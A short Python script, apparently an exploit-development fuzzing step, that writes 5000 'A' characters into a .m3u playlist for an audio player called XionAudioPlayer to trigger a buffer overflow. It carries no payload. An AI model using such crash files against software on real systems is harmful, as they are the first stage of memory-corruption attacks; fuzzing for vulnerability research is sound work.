import struct

fuzz = "\x41" * 5000

filename = "C:\Documents and Settings\yunaranyancat\Desktop\XionAudioPlayer\unicode.m3u"

with open(filename, 'w') as outfile:
    outfile.write(fuzz)
